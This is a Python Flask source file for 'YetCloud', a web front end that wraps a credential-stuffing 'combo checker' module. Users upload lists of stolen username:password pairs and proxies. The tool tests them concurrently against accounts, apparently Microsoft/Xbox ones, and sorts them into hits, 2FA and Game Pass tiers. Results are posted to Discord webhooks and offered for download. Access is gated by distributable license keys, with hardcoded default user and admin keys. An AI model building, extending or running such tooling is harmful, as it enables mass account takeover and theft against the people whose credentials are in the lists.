"""
YetCloud Web Interface
Wraps the existing FlareCloud.py checker with a Flask web server.
The checking logic is NOT modified — only the I/O layer is replaced.
Supports multiple concurrent checker sessions (per-user isolation).
"""

import os
import sys
import io
import re
import time
import json
import hashlib
import zipfile
import secrets
import string
import threading
import concurrent.futures
from collections import deque
from datetime import datetime, timezone, timedelta
from functools import wraps
from flask import Flask, render_template, request, jsonify, Response, send_file, session, redirect, url_for

# ── Ensure this directory is on the path so we can import yetcloud ──
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ═══════════════════════════════════════════
#  PER-SESSION CHECKER STATE
# ═══════════════════════════════════════════

# Thread-local to track which session a checker thread belongs to
_thread_session = threading.local()

# All active checker sessions: session_id -> state dict
checker_sessions = {}
sessions_lock = threading.Lock()

# Result types that count as "checked" (one combo processed)
RESULT_TYPES = {'hit', 'bad', 'twofa', 'other'}
LOG_STAT_MAP = {
    'hit': 'hits',
    'bad': 'bad',
    'twofa': 'twofa',
    'valid': 'vm',
    'xgp': 'xgp',
    'xgpu': 'xgpu',
    'other': 'other',
    'error': 'errors',
}

# Global log buffer for system messages (non-session)
global_log_buffer = deque(maxlen=200)
global_log_lock = threading.Lock()


def create_checker_session():
    """Create a fresh per-session checker state."""
    return {
        'running': False,
        'finished': False,
        'combo_file': None,
        'proxy_file': None,
        'combo_count': 0,
        'proxy_count': 0,
        'session_name': None,
        'start_time': None,
        'combos_list': [],
        # Per-session counters (tracked from log output)
        'hits': 0, 'bad': 0, 'twofa': 0, 'sfa': 0, 'mfa': 0,
        'xgp': 0, 'xgpu': 0, 'other': 0, 'vm': 0,
        'checked': 0, 'errors': 0, 'retries': 0, 'total': 0,
        # Per-session log buffer
        'log_buffer': deque(maxlen=500),
    }


def get_checker_session(sid):
    """Get or create a checker session for the given session ID."""
    with sessions_lock:
        if sid not in checker_sessions:
            checker_sessions[sid] = create_checker_session()
        return checker_sessions[sid]


# ═══════════════════════════════════════════
#  LIVE LOG CAPTURE (stdout interceptor)
# ═══════════════════════════════════════════


class LogCapture(io.TextIOBase):
    """Wraps stdout to capture checker prints per-session."""

    def __init__(self, original_stdout):
        self.original = original_stdout

    def write(self, text):
        if not text: return 0
        if isinstance(text, bytes):
            try: text = text.decode('utf-8', errors='ignore')
            except: text = str(text)
        
        # Get the session ID from the thread-local (set by checker threads)
        sid = getattr(_thread_session, 'session_id', None)

        # Split by newline to capture individual log lines correctly
        lines = text.split('\n')
        for clean_raw in lines:
            clean = re.sub(r'\x1b\[[0-9;]*m', '', clean_raw).strip()
            if clean:
                timestamp = datetime.now().strftime('%H:%M:%S')
                log_type = 'info'
                low_clean = clean.lower()
                if 'hit:' in low_clean: log_type = 'hit'
                elif 'bad:' in low_clean: log_type = 'bad'
                elif '2fa:' in low_clean: log_type = 'twofa'
                elif 'valid mail:' in low_clean: log_type = 'valid'
                elif 'game pass ultimate' in low_clean: log_type = 'xgpu'
                elif 'game pass' in low_clean: log_type = 'xgp'
                elif 'other:' in low_clean: log_type = 'other'
                elif any(x in low_clean for x in ['scraped', 'loaded', 'checking']): log_type = 'system'
                elif 'error' in low_clean: log_type = 'error'
                
                entry = {'time': timestamp, 'type': log_type, 'text': clean}

                # Route to the correct session's log buffer + update counters
                if sid and sid in checker_sessions:
                    sess = checker_sessions[sid]
                    sess['log_buffer'].append(entry)
                    # Update per-session stat counters from log output
                    stat_key = LOG_STAT_MAP.get(log_type)
                    if stat_key:
                        sess[stat_key] = sess.get(stat_key, 0) + 1
                    if log_type in RESULT_TYPES:
                        sess['checked'] = sess.get('checked', 0) + 1
                else:
                    # Global log (system messages, startup, etc.)
                    with global_log_lock:
                        global_log_buffer.append(entry)

        try:
            if self.original:
                self.original.write(text)
        except: pass
        return len(text)

    def flush(self):
        try:
            if self.original:
                self.original.flush()
        except:
            pass

    def fileno(self):
        return self.original.fileno()


_original_stdout = sys.stdout
sys.stdout = LogCapture(_original_stdout)

# ── Import the checker module (untouched) ──
import FlareCloud as fc
from werkzeug.utils import secure_filename

# ── Flask app ──
app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", secrets.token_hex(32))
app.config['MAX_CONTENT_LENGTH'] = 200 * 1024 * 1024
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'uploads')
KEYS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keys.json')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ═══════════════════════════════════════════
#  KEY MANAGEMENT SYSTEM
# ═══════════════════════════════════════════

ADMIN_KEY = os.environ.get("ADMIN_KEY", "ADMIN-YETCLOUD-MASTER")

def load_keys():
    """Load keys from JSON file."""
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    # Default: include the original permanent key
    default = {
        "permanent": ["KEY-5545TS-G56OL5Y"],
        "temporary": []  # { "key": "...", "expires": "ISO timestamp", "label": "..." }
    }
    save_keys(default)
    return default


def save_keys(data):
    """Save keys to JSON file with hashing migration."""
    # Ensure all keys are hashed before saving to disk
    if 'permanent' in data:
        data['permanent'] = [hash_key(k) if not is_hashed(k) else k for k in data['permanent']]
    if 'temporary' in data:
        for tk in data['temporary']:
            if not is_hashed(tk['key']):
                tk['key'] = hash_key(tk['key'])
                
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f, indent=2)


def generate_temp_key():
    """Generate a random key like KEY-XXXXXX-XXXXXXX."""
    part1 = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    part2 = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    return f"KEY-{part1}-{part2}"


def hash_key(key):
    """Hash a key using SHA-256."""
    return hashlib.sha256(key.encode()).hexdigest()


def is_hashed(key):
    """Check if a string is already a 64-char SHA-256 hash."""
    return len(key) == 64 and all(c in "0123456789abcdef" for c in key)


def validate_key(key):
    """Check if a key is valid (permanent or non-expired temp)."""
    keys_data = load_keys()
    input_hash = hash_key(key)
    
    # Check permanent keys (support both hashed and plain during migration)
    for pk in keys_data.get('permanent', []):
        if pk == key or pk == input_hash:
            return True
            
    # Check temp keys
    now = datetime.now(timezone.utc)
    for tk in keys_data.get('temporary', []):
        if tk['key'] == key or tk['key'] == input_hash:
            expires = datetime.fromisoformat(tk['expires'])
            if now < expires:
                return True
    return False


# Rate limiting
login_attempts = {}
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_SECONDS = 300


def check_rate_limit(ip):
    now = time.time()
    if ip in login_attempts:
        record = login_attempts[ip]
        if now - record['last_attempt'] > LOCKOUT_SECONDS:
            login_attempts[ip] = {'count': 0, 'last_attempt': now}
            return True
        if record['count'] >= MAX_LOGIN_ATTEMPTS:
            return False
    return True


def record_attempt(ip, success):
    now = time.time()
    if ip not in login_attempts:
        login_attempts[ip] = {'count': 0, 'last_attempt': now}
    if success:
        login_attempts[ip] = {'count': 0, 'last_attempt': now}
    else:
        login_attempts[ip]['count'] += 1
        login_attempts[ip]['last_attempt'] = now


def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            if request.is_json or request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized'}), 401
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('is_admin'):
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated_function


# ═══════════════════════════════════════════
#  AUTH ROUTES
# ═══════════════════════════════════════════

@app.route('/login')
def login_page():
    if session.get('authenticated'):
        return redirect(url_for('index'))
    return render_template('login.html')


@app.route('/api/login', methods=['POST'])
def login():
    ip = request.remote_addr
    if not check_rate_limit(ip):
        remaining = int(LOCKOUT_SECONDS - (time.time() - login_attempts[ip]['last_attempt']))
        return jsonify({'error': f'Too many attempts. Try again in {remaining}s'}), 429

    data = request.get_json()
    key = (data.get('key') or '').strip()
    if not key:
        record_attempt(ip, False)
        return jsonify({'error': 'No key provided'}), 400

    # Check admin key
    if key == ADMIN_KEY:
        record_attempt(ip, True)
        session['authenticated'] = True
        session['is_admin'] = True
        session['session_id'] = secrets.token_hex(8)
        session.permanent = False
        return jsonify({'success': True, 'admin': True})

    # Check user keys
    if validate_key(key):
        record_attempt(ip, True)
        session['authenticated'] = True
        session['is_admin'] = False
        session['session_id'] = secrets.token_hex(8)
        session.permanent = False
        return jsonify({'success': True, 'admin': False})
    else:
        record_attempt(ip, False)
        attempts_left = MAX_LOGIN_ATTEMPTS - login_attempts.get(ip, {}).get('count', 0)
        return jsonify({'error': f'Invalid key. {max(0, attempts_left)} attempts remaining.'}), 401


@app.route('/logout', methods=['POST'])
def logout():
    # Clean up checker session on logout
    sid = session.get('session_id')
    if sid and sid in checker_sessions:
        checker_sessions[sid]['running'] = False
        with sessions_lock:
            del checker_sessions[sid]
    session.clear()
    return redirect(url_for('login_page'))


# ═══════════════════════════════════════════
#  ADMIN — KEY MANAGEMENT
# ═══════════════════════════════════════════

@app.route('/admin')
@login_required
@admin_required
def admin_page():
    return render_template('admin.html')


@app.route('/api/admin/keys', methods=['GET'])
@login_required
@admin_required
def get_keys():
    """Get all keys (permanent + temp)."""
    keys_data = load_keys()
    # Clean expired temp keys
    now = datetime.now(timezone.utc)
    keys_data['temporary'] = [
        tk for tk in keys_data.get('temporary', [])
        if datetime.fromisoformat(tk['expires']) > now
    ]
    save_keys(keys_data)
    return jsonify(keys_data)


@app.route('/api/admin/keys/create', methods=['POST'])
@login_required
@admin_required
def create_temp_key():
    """Create a new temporary key."""
    data = request.get_json()
    duration_hours = int(data.get('hours', 24))
    label = data.get('label', 'Temporary Key')

    new_key = generate_temp_key()
    expires = (datetime.now(timezone.utc) + timedelta(hours=duration_hours)).isoformat()

    keys_data = load_keys()
    keys_data['temporary'].append({
        'key': new_key,
        'expires': expires,
        'label': label,
        'created': datetime.now(timezone.utc).isoformat()
    })
    save_keys(keys_data)

    return jsonify({
        'success': True,
        'key': new_key,
        'expires': expires,
        'label': label
    })


@app.route('/api/admin/keys/delete', methods=['POST'])
@login_required
@admin_required
def delete_key():
    """Delete a key."""
    data = request.get_json()
    key_to_delete = data.get('key', '')

    keys_data = load_keys()
    keys_data['permanent'] = [k for k in keys_data['permanent'] if k != key_to_delete]
    keys_data['temporary'] = [tk for tk in keys_data['temporary'] if tk['key'] != key_to_delete]
    save_keys(keys_data)

    return jsonify({'success': True})


@app.route('/api/admin/keys/add-permanent', methods=['POST'])
@login_required
@admin_required
def add_permanent_key():
    """Add a permanent key."""
    data = request.get_json()
    key = data.get('key', '').strip()
    if not key:
        key = generate_temp_key()

    keys_data = load_keys()
    if key not in keys_data['permanent']:
        keys_data['permanent'].append(key)
        save_keys(keys_data)

    return jsonify({'success': True, 'key': key})


# ═══════════════════════════════════════════
#  DASHBOARD ROUTES (Protected, Per-Session)
# ═══════════════════════════════════════════

@app.route('/')
@login_required
def index():
    return render_template('index.html', is_admin=session.get('is_admin', False))


@app.route('/api/upload/combos', methods=['POST'])
@login_required
def upload_combos():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)

    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    f = request.files['file']
    if f.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    filename = secure_filename(f.filename)
    filepath = os.path.join(UPLOAD_FOLDER, f'{sid}_combos_{filename}')
    f.save(filepath)
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as fh:
            lines = fh.readlines()
            unique = list(set(lines))
            dupes = len(lines) - len(unique)
            sess['combo_file'] = filepath
            sess['combo_count'] = len(unique)
            return jsonify({'success': True, 'filename': filename, 'total': len(lines), 'unique': len(unique), 'dupes': dupes})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/upload/proxies', methods=['POST'])
@login_required
def upload_proxies():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)

    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400
    f = request.files['file']
    if f.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    filename = secure_filename(f.filename)
    filepath = os.path.join(UPLOAD_FOLDER, f'{sid}_proxies_{filename}')
    f.save(filepath)
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as fh:
            lines = [l.strip() for l in fh.readlines() if l.strip()]
            sess['proxy_file'] = filepath
            sess['proxy_count'] = len(lines)
            return jsonify({'success': True, 'filename': filename, 'count': len(lines)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/start', methods=['POST'])
@login_required
def start_check():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)

    # Only block if THIS user already has a check running
    if sess['running']:
        return jsonify({'error': 'You already have a check running'}), 409

    data = request.get_json()
    threads = int(data.get('threads', 5))
    proxy_type = str(data.get('proxyType', '4'))
    webhook = data.get('webhook', '').strip()
    banned_webhook = data.get('bannedWebhook', '').strip()
    unbanned_webhook = data.get('unbannedWebhook', '').strip()

    if not sess['combo_file']:
        return jsonify({'error': 'No combo file uploaded'}), 400

    try: fc.loadconfig()
    except: pass

    if webhook: fc.config.set('webhook', webhook)
    if banned_webhook: fc.config.set('bannedwebhook', banned_webhook)
    if unbanned_webhook: fc.config.set('unbannedwebhook', unbanned_webhook)

    fc.proxytype = f"'{proxy_type}'"
    fc.screen = "'2'"

    # Load combos for this session
    try:
        with open(sess['combo_file'], 'r', encoding='utf-8', errors='ignore') as fh:
            sess['combos_list'] = list(set(fh.readlines()))
    except Exception as e:
        return jsonify({'error': f'Failed to load combos: {str(e)}'}), 500

    # Session file name for results
    fname = os.path.splitext(os.path.basename(sess['combo_file']))[0]
    if '_combos_' in fname:
        fname = fname.split('_combos_', 1)[1]
    sess['session_name'] = f"{sid}_{fname}"

    # Load proxies if needed
    if proxy_type in ('1', '2', '3') and sess['proxy_file']:
        fc.proxylist.clear()
        try:
            with open(sess['proxy_file'], 'r', encoding='utf-8', errors='ignore') as fh:
                for line in fh.readlines():
                    try: fc.proxylist.append(line.split()[0].replace('\n', ''))
                    except: pass
        except: pass
    elif proxy_type == '4':
        fc.proxylist.clear()

    os.makedirs('results', exist_ok=True)
    os.makedirs(f'results/{sess["session_name"]}', exist_ok=True)

    # Reset per-session counters
    for k in ['hits','bad','twofa','sfa','mfa','xgp','xgpu','other','vm','checked','errors','retries']:
        sess[k] = 0
    sess['total'] = len(sess['combos_list'])
    sess['log_buffer'].clear()

    sess['running'] = True
    sess['finished'] = False
    sess['start_time'] = time.time()

    # Also set fc globals for the checker to work (fname for result file paths)
    fc.fname = sess['session_name']

    def run_checker():
        combos = list(sess['combos_list'])  # Local copy
        try:
            if proxy_type == '5':
                threading.Thread(target=fc.get_proxies, daemon=True).start()
                while len(fc.proxylist) == 0:
                    time.sleep(1)
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(session_checker, combo, sid) for combo in combos]
                concurrent.futures.wait(futures)
        except Exception as e:
            print(f"Checker error: {e}")
        finally:
            sess['running'] = False
            sess['finished'] = True
            # Send webhook summary
            try:
                webhook_url = fc.config.get('webhook')
                if webhook_url and webhook_url != 'paste your discord webhook here':
                    import requests as req
                    req.post(webhook_url, json={
                        "username": "YetCloud",
                        "embeds": [{"title": "YetCloud Checking Summary", "color": 0x00FF00,
                            "fields": [
                                {"name": "Total", "value": str(sess['total']), "inline": True},
                                {"name": "Hits", "value": str(sess['hits']), "inline": True},
                                {"name": "Bad", "value": str(sess['bad']), "inline": True},
                                {"name": "2FA", "value": str(sess['twofa']), "inline": True},
                                {"name": "XGP", "value": str(sess['xgp']), "inline": True},
                                {"name": "XGPU", "value": str(sess['xgpu']), "inline": True},
                                {"name": "Other", "value": str(sess['other']), "inline": True},
                            ],
                            "footer": {"text": "YetCloud"},
                            "timestamp": datetime.now(timezone.utc).isoformat()
                        }]
                    }, headers={"Content-Type": "application/json"})
            except: pass

    threading.Thread(target=run_checker, daemon=True).start()
    return jsonify({'success': True, 'total': len(sess['combos_list']), 'session': sess['session_name']})


def session_checker(combo, sid):
    """Wrapper that sets the thread-local session ID before calling fc.Checker."""
    _thread_session.session_id = sid
    try:
        fc.Checker(combo)
    except Exception as e:
        # Count as error for this session
        if sid in checker_sessions:
            checker_sessions[sid]['errors'] += 1


@app.route('/api/status')
@login_required
def status_stream():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)

    def generate():
        while True:
            # Calculate CPM from per-session counters
            cpm = 0
            if sess['running'] and sess['start_time']:
                elapsed = time.time() - sess['start_time']
                if elapsed > 1:
                    cpm = int((sess['checked'] / elapsed) * 60)
            
            data = {
                'hits': sess['hits'], 'bad': sess['bad'], 'twofa': sess['twofa'],
                'sfa': sess['sfa'], 'mfa': sess['mfa'], 'xgp': sess['xgp'],
                'xgpu': sess['xgpu'], 'other': sess['other'], 'vm': sess['vm'],
                'checked': sess['checked'], 'total': sess['total'], 'cpm': cpm,
                'retries': sess['retries'], 'errors': sess['errors'],
                'running': sess['running'], 'finished': sess['finished'],
            }
            yield f"data: {json.dumps(data)}\n\n"
            if sess['finished'] and not sess['running']:
                yield f"data: {json.dumps({**data, 'finished': True})}\n\n"
                break
            time.sleep(1)
    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no', 'Connection': 'keep-alive'})


@app.route('/api/logs')
@login_required
def log_stream():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)

    def generate():
        sent_index = 0
        while True:
            current_len = len(sess['log_buffer'])
            buf_list = list(sess['log_buffer'])
            if sent_index < current_len:
                for entry in buf_list[sent_index:]:
                    yield f"data: {json.dumps(entry)}\n\n"
                sent_index = current_len
            elif sent_index > current_len:
                sent_index = 0
            if sess['finished'] and not sess['running']:
                yield f"data: {json.dumps({'type': 'system', 'text': 'Checking complete!', 'time': datetime.now().strftime('%H:%M:%S')})}\n\n"
                break
            time.sleep(0.5)
    return Response(generate(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no', 'Connection': 'keep-alive'})


@app.route('/api/download')
@login_required
def download_results():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)
    session_name = sess.get('session_name')
    if not session_name:
        return jsonify({'error': 'No results available'}), 404
    result_dir = os.path.join('results', session_name)
    if not os.path.exists(result_dir):
        return jsonify({'error': 'Results directory not found'}), 404
    zip_path = os.path.join(UPLOAD_FOLDER, f'{session_name}_results.zip')
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(result_dir):
            for file in files:
                fp = os.path.join(root, file)
                zf.write(fp, os.path.relpath(fp, result_dir))
    return send_file(zip_path, mimetype='application/zip', as_attachment=True, download_name=f'{session_name}_results.zip')


@app.route('/api/stop', methods=['POST'])
@login_required
def stop_check():
    sid = session.get('session_id', 'default')
    sess = get_checker_session(sid)
    if sess['running']:
        sess['combos_list'].clear()
        sess['running'] = False
        sess['finished'] = True
        return jsonify({'success': True, 'message': 'Stopping...'})
    return jsonify({'error': 'No check is running'}), 400


# ═══════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════

if __name__ == '__main__':
    # Initialize keys file
    load_keys()
    print("\n  ╔══════════════════════════════════════════════╗")
    print("  ║       YetCloud Web Interface                ║")
    print("  ║       Open:  http://localhost:5000            ║")
    print("  ║       User:  KEY-5545TS-G56OL5Y              ║")
    print("  ║       Admin: ADMIN-YETCLOUD-MASTER           ║")
    print("  ╚══════════════════════════════════════════════╝\n")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
